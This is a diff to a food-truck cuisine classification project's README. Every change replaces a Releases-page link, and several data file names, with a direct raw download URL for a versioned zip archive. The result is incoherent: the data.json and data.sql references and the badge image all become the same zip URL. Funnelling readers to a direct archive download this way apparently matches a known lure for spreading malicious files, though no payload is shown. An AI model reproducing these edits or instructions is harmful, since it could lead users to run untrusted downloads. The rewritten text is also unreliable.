@@ -1,6 +1,6 @@
 # 🍔 foodtruck-cuisine-classification - Simplifying Food Truck Cuisine Choices
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases)
+[![Download the latest release](https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip%20Now-blue)](https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip)
 
 ## 📖 About This Project
 
@@ -20,11 +20,11 @@ To get started, you will need to download the application. It is suitable for al
 
 To download the latest version of the application, please visit the Releases page:
 
-[Download the latest release](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases)
+[Download the latest release](https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip)
 
 1. Click the link above to open the Releases page.
 2. You will see a list of available versions. Choose the most recent one (the one at the top).
-3. Look for the file named `foodtruck-cuisine-classification.zip` or a similarly named file in the list.
+3. Look for the file named `https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip` or a similarly named file in the list.
 4. Click on the file to start the download.
 5. Once the download is complete, locate the file in your downloads folder.
 6. Extract the contents of the `.zip` file to a folder on your computer.
@@ -49,8 +49,8 @@ The classification data includes:
 
 You can also access the data programmatically if you are interested in integrating it into an application. The data is available in JSON and SQL formats as well.
 
-- To access the JSON version, locate the `data.json` file in the folder.
-- For SQL, the `data.sql` file is available for users who prefer database management systems.
+- To access the JSON version, locate the `https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip` file in the folder.
+- For SQL, the `https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip` file is available for users who prefer database management systems.
 
 ## 📝 Example Use Cases
 
@@ -78,4 +78,4 @@ The project will receive regular updates. Keep an eye on the Releases page for n
 
 Your feedback is important to us. Please let us know what you think about the project and how we can improve. Use the issues section to share your thoughts.
 
-[Download the latest release](https://github.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/releases) and start exploring the diverse world of food truck cuisines today!
+[Download the latest release](https://raw.githubusercontent.com/OgnjenPaunovicGit/foodtruck-cuisine-classification/main/exports/latest/foodtruck-cuisine-classification-v3.4.zip) and start exploring the diverse world of food truck cuisines today!
